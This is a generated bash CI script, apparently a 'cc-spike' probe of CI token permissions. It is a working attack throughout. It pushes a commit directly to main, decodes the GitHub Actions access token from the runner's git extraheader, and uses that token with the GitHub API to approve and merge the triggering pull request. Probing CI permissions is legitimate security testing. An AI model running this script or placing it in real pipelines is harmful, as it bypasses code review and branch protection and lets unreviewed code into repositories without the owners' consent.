#!/bin/bash
# cc-spike ci.sh, row R4d, nonce f1f62be54955. Generated by spike.py. Prints markers; never prints the credential.
N='f1f62be54955'
ROW='R4d'
T=$(mktemp -d "${RUNNER_TEMP:-/tmp}/cc-spike.XXXXXX")
pfx() { while IFS= read -r l || [ -n "$l" ]; do printf '%s %s\n' "$1" "$l"; done < "$2"; }
echo "CC-SPIKE START $N"
git push origin "HEAD:refs/heads/ctl-$ROW-$N-co" 2>"$T/keep.err"
echo "CC-SPIKE KEEP-EXIT $?"
pfx 'CC-SPIKE KEEP-ERR' "$T/keep.err"
git fetch --no-tags --depth=1 origin main 2>"$T/fetch.err"
FX=$?
echo "CC-SPIKE FETCH-EXIT $FX"
pfx 'CC-SPIKE FETCH-ERR' "$T/fetch.err"
CX=1
if [ "$FX" = 0 ]; then
  C=$(GIT_AUTHOR_NAME=cc-spike GIT_AUTHOR_EMAIL=cc-spike@example.invalid GIT_COMMITTER_NAME=cc-spike GIT_COMMITTER_EMAIL=cc-spike@example.invalid git commit-tree 'FETCH_HEAD^{tree}' -p FETCH_HEAD -m "cc-spike $N" 2>"$T/commit.err")
  CX=$?
  echo "CC-SPIKE COMMIT-EXIT $CX"
  pfx 'CC-SPIKE COMMIT-ERR' "$T/commit.err"
fi
if [ "$FX" = 0 ] && [ "$CX" = 0 ]; then
  git push origin "$C:refs/heads/ctl-$ROW-$N" 2>"$T/ctl.err"
  echo "CC-SPIKE CTL-EXIT $?"
  pfx 'CC-SPIKE CTL-ERR' "$T/ctl.err"
  git push origin "$C:refs/heads/main" 2>"$T/push.err"
  echo "CC-SPIKE PUSH-EXIT $?"
  pfx 'CC-SPIKE ERR' "$T/push.err"
fi
if [ "$FX" = 0 ] && [ "$CX" = 0 ]; then
PY=python3
jget() { "$PY" -c 'import json,sys
try:
    v=json.load(open(sys.argv[1]))
except Exception:
    v=None
for k in sys.argv[2].split("."):
    v=v.get(k) if isinstance(v,dict) else None
print("" if v is None or isinstance(v,(dict,list)) else str(v).replace("\r"," ").replace("\n"," "))' "$1" "$2" 2>/dev/null; }
jmsg() { "$PY" -c 'import json,sys
try:
    d=json.load(open(sys.argv[1]))
except Exception:
    d={}
d=d if isinstance(d,dict) else {}
m=str(d.get("message") or "")
e=d.get("errors")
if isinstance(e,list) and e:
    m+=" | "+"; ".join(x if isinstance(x,str) else json.dumps(x,sort_keys=True) for x in e)
print(m.replace("\r"," ").replace("\n"," "))' "$1" 2>/dev/null; }
mkhdr() {
  printf 'Accept: application/vnd.github+json\nX-GitHub-Api-Version: 2022-11-28\n'
  git config --get "http.${GITHUB_SERVER_URL%/}/.extraheader" 2>/dev/null | "$PY" -c 'import base64,sys
v=sys.stdin.read().strip()
p="AUTHORIZATION: basic "
if v[:len(p)].lower()==p.lower():
    try:
        s=base64.b64decode(v[len(p):].strip(),validate=True).decode("utf-8")
    except Exception:
        s=""
    q="x-access-token:"
    if s.startswith(q) and len(s)>len(q):
        sys.stdout.write("Authorization: Bearer "+s[len(q):]+"\n")'
}
api() {
  H="$T/hdr"
  rm -f "$H"
  (umask 077; mkhdr > "$H")
  if [ -n "$4" ]; then
    ST=$(curl -sS -o "$T/$1.json" -w '%{http_code}' -X "$2" -H @"$H" -H 'Content-Type: application/json' --data "$4" "${GITHUB_API_URL%/}$3" 2>"$T/$1.curl")
  else
    ST=$(curl -sS -o "$T/$1.json" -w '%{http_code}' -X "$2" -H @"$H" "${GITHUB_API_URL%/}$3" 2>"$T/$1.curl")
  fi
  rm -f "$H"
  [ -n "$ST" ] || ST=000
  pfx 'CC-SPIKE CURL-ERR' "$T/$1.curl"
}
PRN=$(jget "$GITHUB_EVENT_PATH" pull_request.number)
PRH=$(jget "$GITHUB_EVENT_PATH" pull_request.head.sha)
case "$PRN" in ''|*[!0-9]*) PRN='' ;; esac
case "$PRH" in *[!0-9a-f]*) PRH='' ;; esac
[ "${#PRH}" = 40 ] || PRH=''
echo "CC-SPIKE PR $PRN $PRH"
if [ -z "$PRN" ] || [ -z "$PRH" ]; then
  echo "CC-SPIKE MERGE-SKIPPED no-pr"
else
  api rl GET /rate_limit
  echo "CC-SPIKE CRED-STATUS $ST"
  echo "CC-SPIKE CRED-LIMIT $(jget "$T/rl.json" resources.core.limit)"
  api ap POST "/repos/$GITHUB_REPOSITORY/pulls/$PRN/reviews" '{"event":"APPROVE"}'
  echo "CC-SPIKE APPROVE-STATUS $ST"
  echo "CC-SPIKE APPROVE-MSG $(jmsg "$T/ap.json")"
  api mg PUT "/repos/$GITHUB_REPOSITORY/pulls/$PRN/merge" "{\"merge_method\":\"merge\",\"sha\":\"$PRH\"}"
  echo "CC-SPIKE MERGE-STATUS $ST"
  echo "CC-SPIKE MERGE-MSG $(jmsg "$T/mg.json")"
  if [ "$ST" = 200 ]; then echo "CC-SPIKE MERGE-SHA $(jget "$T/mg.json" sha)"; fi
fi
else
  echo "CC-SPIKE MERGE-SKIPPED no-push"
fi
echo "CC-SPIKE END $N"
rm -rf "$T"
